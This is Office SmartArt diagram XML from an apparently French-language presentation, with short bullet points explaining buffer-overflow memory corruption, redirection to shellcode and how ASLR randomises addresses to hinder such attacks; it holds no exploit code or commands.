      <dgm:prSet presAssocID="{D5B810B9-5570-480D-8DBD-39FB65BB1AC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28A720F-3379-7344-B5C2-4AF0C1B78629}" type="presOf" srcId="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" destId="{7E0F583A-C4CE-724E-B85D-27DA84F3BFF4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E7466611-89B9-488C-B3D2-E1EA46A86CD9}" srcId="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" destId="{342592F5-B5F8-4254-B3E6-0A54291E2A00}" srcOrd="0" destOrd="0" parTransId="{12733328-4F9D-413F-B2C5-1B82136D460F}" sibTransId="{24E6A303-9929-4C08-8D07-6932BB88A39F}"/>
    <dgm:cxn modelId="{9D6A3927-CBC2-2045-B603-8DBDAD1EC321}" type="presOf" srcId="{3C47B5FA-02B3-40E7-B973-4AD83EEF52B0}" destId="{BE479CDF-341A-054D-922E-59C4175FC286}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{0562F339-31E4-B748-B5C4-C896CCB4327C}" type="presOf" srcId="{25C29079-169D-49AD-8ECB-25FC1AFEA74A}" destId="{A03F4655-8B06-DC4C-8C76-8F3A5949CE1E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C4CB573F-35B2-5C4E-8C2A-39979E9B2CBE}" type="presOf" srcId="{342592F5-B5F8-4254-B3E6-0A54291E2A00}" destId="{D87BCF0B-06F2-9B48-91C8-0C4EF94C3898}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{6DEA616C-E1D9-42E7-85E7-65DA4C59C241}" srcId="{3C47B5FA-02B3-40E7-B973-4AD83EEF52B0}" destId="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" srcOrd="1" destOrd="0" parTransId="{4B5EB875-7024-40CF-BA66-43442FA056E7}" sibTransId="{F9BD4EAF-81C6-445F-A009-F593495B1A93}"/>
    <dgm:cxn modelId="{E756BA75-BC83-E140-BF22-A4B5D33D67C1}" type="presOf" srcId="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" destId="{677AB83F-B04D-3045-A601-91356C8615B9}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{217DF0BD-4FCA-054B-9BA4-0CC3D3AAC9AC}" type="presOf" srcId="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" destId="{658B51C4-B5E9-E147-917D-984533922ABB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{238D3CCF-1C5D-4E56-9A97-9DC379C98FE7}" srcId="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" destId="{25C29079-169D-49AD-8ECB-25FC1AFEA74A}" srcOrd="0" destOrd="0" parTransId="{987F5609-95B0-4B42-BFD1-B9F87350B4EF}" sibTransId="{9A615A1D-DEF3-445C-91BE-46E678C6FDEB}"/>
    <dgm:cxn modelId="{A6C3D2F3-3172-439C-8D00-72C67E57D5BE}" srcId="{3C47B5FA-02B3-40E7-B973-4AD83EEF52B0}" destId="{4008E545-C76D-4BF1-ABBD-7882BA81E069}" srcOrd="0" destOrd="0" parTransId="{04DE71D1-851F-4AA8-AEAD-ABCE53AE3DD0}" sibTransId="{835EB46B-B0DC-4961-8A93-581E3E7BA2D0}"/>
    <dgm:cxn modelId="{B084E8FC-7A06-CB4C-B1EA-91C9928550BD}" type="presOf" srcId="{D5B810B9-5570-480D-8DBD-39FB65BB1ACE}" destId="{734DD581-4482-9044-8BAF-A96E1931CA64}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{2076EAB9-5246-1F44-BFD0-9E2F11F2AECA}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{30593AAD-4909-6D45-8620-AB1002129532}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{9C23FEC9-16D3-414D-9AC7-A7E89389ED36}" type="presParOf" srcId="{30593AAD-4909-6D45-8620-AB1002129532}" destId="{658B51C4-B5E9-E147-917D-984533922ABB}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{E90F335E-9A86-BA48-9257-E4B49E60396C}" type="presParOf" srcId="{30593AAD-4909-6D45-8620-AB1002129532}" destId="{7E0F583A-C4CE-724E-B85D-27DA84F3BFF4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C218A460-FCFB-8048-90D1-D4D96C6542A0}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{2F43E820-D1A9-6140-AB99-C7056F5DD47E}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8432E79A-BD32-4A4C-9E80-00569C4E2CB0}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{D87BCF0B-06F2-9B48-91C8-0C4EF94C3898}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{525D1CC7-244E-2344-A8F5-A6C0AC2E18DA}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{6972E312-D199-514A-A9C3-B93A007464D4}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{85D54EEA-203C-7747-898C-020F1203550D}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{278ECA22-E4C5-7F4A-8377-CA2AD7551BEE}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{30B03BC1-0E22-6046-9311-77C70187B96B}" type="presParOf" srcId="{278ECA22-E4C5-7F4A-8377-CA2AD7551BEE}" destId="{734DD581-4482-9044-8BAF-A96E1931CA64}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{C7F2B4B2-53E9-5745-BC78-34109041C938}" type="presParOf" srcId="{278ECA22-E4C5-7F4A-8377-CA2AD7551BEE}" destId="{677AB83F-B04D-3045-A601-91356C8615B9}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CFB24AA4-96B2-7A4D-ABD3-0AA6059EECEF}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{B76C8D36-B8DA-FC45-B442-0F4F6C86CF17}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{05F8E472-91A2-AB4C-B319-878F9925AA51}" type="presParOf" srcId="{BE479CDF-341A-054D-922E-59C4175FC286}" destId="{A03F4655-8B06-DC4C-8C76-8F3A5949CE1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ACE507D2-B793-4E11-84F6-04872F6FFF81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1326F5-93CF-4DFD-B209-94F2BEE902CA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Corruption de mémoire :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A357F7C8-D830-4CD0-A592-643969A7E15D}" type="parTrans" cxnId="{CEB39AFB-2DEE-458B-82D2-42F17683D7B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{4B2C7D4B-9F08-44D1-ACA3-D831D211E5B0}" type="sibTrans" cxnId="{CEB39AFB-2DEE-458B-82D2-42F17683D7B2}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{CF83572B-906E-4AC9-A813-5709135AECAC}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Les données écrites au-delà du buffer peuvent écraser des parties critiques (comme le pointeur d'exécution).</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{9E420B2B-2815-403A-AFD5-F165CF051FCD}" type="parTrans" cxnId="{1F43D706-6DE4-44B4-838B-85ED054B4330}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0439F007-ABD7-4E45-99F7-4465DB8E8F9A}" type="sibTrans" cxnId="{1F43D706-6DE4-44B4-838B-85ED054B4330}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Exploitation possible :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D84A4130-07A8-43BB-A32C-D6D0BADD2F4E}" type="parTrans" cxnId="{1AC57840-CE6C-4A5B-8A0E-1DE3CD43FA02}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{0DB669DD-E420-4B62-9786-374D138F927D}" type="sibTrans" cxnId="{1AC57840-CE6C-4A5B-8A0E-1DE3CD43FA02}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{FF36489C-AEF9-43A4-99CF-7AF781619FC4}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Rediriger l’exécution du programme vers un shellcode malveillant.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{6D91FD40-C01A-4CC7-B6A6-77FAE8F55BF7}" type="parTrans" cxnId="{59CA6BD8-535E-4634-8B75-584BFD305973}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{526B29B0-D1D8-4EBE-89BD-55A253B71E30}" type="sibTrans" cxnId="{59CA6BD8-535E-4634-8B75-584BFD305973}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{5DD639D4-379B-0245-B85A-ECC56906542D}" type="pres">
      <dgm:prSet presAssocID="{ACE507D2-B793-4E11-84F6-04872F6FFF81}" presName="linear" presStyleCnt="0">
        <dgm:presLayoutVars>
          <dgm:dir/>
          <dgm:animLvl val="lvl"/>
          <dgm:resizeHandles val="exact"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{17CE7957-BDC2-FB4E-B424-1C1A2FBB1468}" type="pres">
      <dgm:prSet presAssocID="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{CD028131-956F-9C43-9DAC-FD356FCC7457}" type="pres">
      <dgm:prSet presAssocID="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5D2E9E15-159F-FA45-8BA2-C81C394FFDF4}" type="pres">
      <dgm:prSet presAssocID="{531326F5-93CF-4DFD-B209-94F2BEE902C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B4030D7-A556-2942-93B2-C854DE706A33}" type="pres">
      <dgm:prSet presAssocID="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{B86B0DB8-8A7A-EF40-A256-FBF988FF913E}" type="pres">
      <dgm:prSet presAssocID="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" presName="childText" presStyleLbl="conFgAcc1" presStyleIdx="0" presStyleCnt="2">
        <dgm:presLayoutVars>
          <dgm:bulletEnabled val="1"/>
        </dgm:presLayoutVars>
      </dgm:prSet>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{235C8180-4BB9-8342-9413-36B9B23216CF}" type="pres">
      <dgm:prSet presAssocID="{4B2C7D4B-9F08-44D1-ACA3-D831D211E5B0}" presName="spaceBetweenRectangles" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{5AA45C4C-B619-BF45-B9B4-245EA2DCF6F2}" type="pres">
      <dgm:prSet presAssocID="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" presName="parentLin" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{C5D84A38-EC68-974D-8BD2-989358C24020}" type="pres">
      <dgm:prSet presAssocID="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" presName="parentLeftMargin" presStyleLbl="node1" presStyleIdx="0" presStyleCnt="2"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{93E50A61-E1C2-3D45-AF41-91EE1613B1FB}" type="pres">
      <dgm:prSet presAssocID="{96E7B661-B579-4EFC-9DBA-31884C2B42F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6E431FC-59A9-4D47-A2AA-C5A280DCDE12}" type="pres">
      <dgm:prSet presAssocID="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" presName="negativeSpace" presStyleCnt="0"/>
      <dgm:spPr/>
    </dgm:pt>
    <dgm:pt modelId="{7426B038-52B0-8A45-827F-8E2A59F7F637}" type="pres">
      <dgm:prSet presAssocID="{96E7B661-B579-4EFC-9DBA-31884C2B42F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F43D706-6DE4-44B4-838B-85ED054B4330}" srcId="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" destId="{CF83572B-906E-4AC9-A813-5709135AECAC}" srcOrd="0" destOrd="0" parTransId="{9E420B2B-2815-403A-AFD5-F165CF051FCD}" sibTransId="{0439F007-ABD7-4E45-99F7-4465DB8E8F9A}"/>
    <dgm:cxn modelId="{2A78470A-2CBB-074D-BC33-523D09CE006E}" type="presOf" srcId="{FF36489C-AEF9-43A4-99CF-7AF781619FC4}" destId="{7426B038-52B0-8A45-827F-8E2A59F7F637}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{105D5211-8F6A-5345-9DA6-3C209F8B0628}" type="presOf" srcId="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" destId="{93E50A61-E1C2-3D45-AF41-91EE1613B1FB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{1AC57840-CE6C-4A5B-8A0E-1DE3CD43FA02}" srcId="{ACE507D2-B793-4E11-84F6-04872F6FFF81}" destId="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" srcOrd="1" destOrd="0" parTransId="{D84A4130-07A8-43BB-A32C-D6D0BADD2F4E}" sibTransId="{0DB669DD-E420-4B62-9786-374D138F927D}"/>
    <dgm:cxn modelId="{B0A3677A-5CBF-7741-9884-5F48C46C57F8}" type="presOf" srcId="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" destId="{5D2E9E15-159F-FA45-8BA2-C81C394FFDF4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{179F19A7-A7CC-8745-B5E2-37DD58FB3A27}" type="presOf" srcId="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" destId="{C5D84A38-EC68-974D-8BD2-989358C24020}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A9EB62B6-86FE-F742-A8FA-DC4126B0B38E}" type="presOf" srcId="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" destId="{CD028131-956F-9C43-9DAC-FD356FCC7457}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{59CA6BD8-535E-4634-8B75-584BFD305973}" srcId="{96E7B661-B579-4EFC-9DBA-31884C2B42FE}" destId="{FF36489C-AEF9-43A4-99CF-7AF781619FC4}" srcOrd="0" destOrd="0" parTransId="{6D91FD40-C01A-4CC7-B6A6-77FAE8F55BF7}" sibTransId="{526B29B0-D1D8-4EBE-89BD-55A253B71E30}"/>
    <dgm:cxn modelId="{E25FA6DB-7230-FA47-BEB8-DAE85CEB0C65}" type="presOf" srcId="{CF83572B-906E-4AC9-A813-5709135AECAC}" destId="{B86B0DB8-8A7A-EF40-A256-FBF988FF913E}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{05DC6AEC-31A4-CE4E-A851-92415A2B8D97}" type="presOf" srcId="{ACE507D2-B793-4E11-84F6-04872F6FFF81}" destId="{5DD639D4-379B-0245-B85A-ECC56906542D}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CEB39AFB-2DEE-458B-82D2-42F17683D7B2}" srcId="{ACE507D2-B793-4E11-84F6-04872F6FFF81}" destId="{531326F5-93CF-4DFD-B209-94F2BEE902CA}" srcOrd="0" destOrd="0" parTransId="{A357F7C8-D830-4CD0-A592-643969A7E15D}" sibTransId="{4B2C7D4B-9F08-44D1-ACA3-D831D211E5B0}"/>
    <dgm:cxn modelId="{7780721B-1EDC-B242-B5E2-05942BCF64B8}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{17CE7957-BDC2-FB4E-B424-1C1A2FBB1468}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{DEAADABA-CD88-5F41-9C3A-A38D5AF6F758}" type="presParOf" srcId="{17CE7957-BDC2-FB4E-B424-1C1A2FBB1468}" destId="{CD028131-956F-9C43-9DAC-FD356FCC7457}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{445543E1-8EAC-D541-AFCB-F8178CDA5EFC}" type="presParOf" srcId="{17CE7957-BDC2-FB4E-B424-1C1A2FBB1468}" destId="{5D2E9E15-159F-FA45-8BA2-C81C394FFDF4}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{892CFC55-6CAD-EE4D-AD5E-8C26D42AB2A3}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{5B4030D7-A556-2942-93B2-C854DE706A33}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{8679767D-8ED7-8D4D-9E60-113C29D931E5}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{B86B0DB8-8A7A-EF40-A256-FBF988FF913E}" srcOrd="2" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{44CB8502-6D15-D44C-82C3-B3F76ADA1E81}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{235C8180-4BB9-8342-9413-36B9B23216CF}" srcOrd="3" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CDB57AEF-0A11-A547-AAC5-7D2F9E029C1A}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{5AA45C4C-B619-BF45-B9B4-245EA2DCF6F2}" srcOrd="4" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{A89EBA7A-2620-CE48-B160-8B162C3BBD25}" type="presParOf" srcId="{5AA45C4C-B619-BF45-B9B4-245EA2DCF6F2}" destId="{C5D84A38-EC68-974D-8BD2-989358C24020}" srcOrd="0" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{CF7637BA-FEC6-D443-B7E2-4F95F3336E8B}" type="presParOf" srcId="{5AA45C4C-B619-BF45-B9B4-245EA2DCF6F2}" destId="{93E50A61-E1C2-3D45-AF41-91EE1613B1FB}" srcOrd="1" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{803EF50D-29E4-A641-9557-19488C79C320}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{86E431FC-59A9-4D47-A2AA-C5A280DCDE12}" srcOrd="5" destOrd="0" presId="urn:microsoft.com/office/officeart/2005/8/layout/list1"/>
    <dgm:cxn modelId="{70ADBCC1-125E-9441-BA6C-1F6EF3F75019}" type="presParOf" srcId="{5DD639D4-379B-0245-B85A-ECC56906542D}" destId="{7426B038-52B0-8A45-827F-8E2A59F7F63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57B7FAFB-E706-4C1C-B9E6-7AC7F518316E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CB279D-66FA-4AE8-941A-337A4FDDEB14}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Qu’est-ce que l’ASLR ?</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{98775F55-AA49-4D6F-8989-593792F7214B}" type="parTrans" cxnId="{9505C117-EB45-418C-91EA-513E329BB5DA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1ECB2072-73F2-460D-BC47-7E98896F801C}" type="sibTrans" cxnId="{9505C117-EB45-418C-91EA-513E329BB5DA}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{87B332C9-04DB-4747-9364-5F7E2376D098}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Address Space Layout Randomization</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{27529180-9C6B-41E9-8C34-10906F4822FB}" type="parTrans" cxnId="{75C4E165-F979-4707-BDC8-2DACDA83B032}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2ED9B7BB-F0FA-4BBE-AAAF-59319D5F3781}" type="sibTrans" cxnId="{75C4E165-F979-4707-BDC8-2DACDA83B032}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1F865106-56BE-4488-B94D-3017DA64FFC9}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Modifie les adresses mémoire à chaque exécution.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{C663E830-6941-4452-A939-E1243C9903FF}" type="parTrans" cxnId="{F57802BB-48C3-4B7E-9620-3406F87B3B4F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{A84E81B4-2F78-4779-9137-D5936108389F}" type="sibTrans" cxnId="{F57802BB-48C3-4B7E-9620-3406F87B3B4F}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{16990B20-AF89-4A60-9C85-5888CC734242}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t>Empêche l’attaquant de prédire où injecter son code.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{1C051A8C-D83A-4E46-9162-5AE3A5E40450}" type="parTrans" cxnId="{6E1B921D-DC12-44A1-8720-A265F26A1C64}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D1F80E50-D746-4A7C-B145-FB35E693EB7B}" type="sibTrans" cxnId="{6E1B921D-DC12-44A1-8720-A265F26A1C64}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{AC1B10F7-19B3-4C3C-9B34-A9239884D7CF}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Visualisation avant/après :</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{D9499FD9-C046-4266-B01A-9C65F3D13D15}" type="parTrans" cxnId="{31874A59-48E1-4B62-B36B-592FE701E314}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{2D309925-B81F-478E-BCBF-7CEE0D29C8FC}" type="sibTrans" cxnId="{31874A59-48E1-4B62-B36B-592FE701E314}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{147C9AED-B15D-40FC-8EDE-3FC29BC559C1}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:r>
            <a:rPr lang="en-GB" b="1"/>
            <a:t>Sans ASLR :</a:t>
          </a:r>
          <a:r>
            <a:rPr lang="en-GB"/>
            <a:t> Les adresses sont fixes.</a:t>
          </a:r>
          <a:endParaRPr lang="en-US"/>
        </a:p>
      </dgm:t>
    </dgm:pt>
    <dgm:pt modelId="{17E9441E-078B-4E29-987B-B813760D1FE5}" type="parTrans" cxnId="{D1D2D90F-B6C7-4C7D-9210-31B03E143295}">
      <dgm:prSet/>
      <dgm:spPr/>
      <dgm:t>
        <a:bodyPr/>
        <a:lstStyle/>
        <a:p>
          <a:endParaRPr lang="en-US"/>
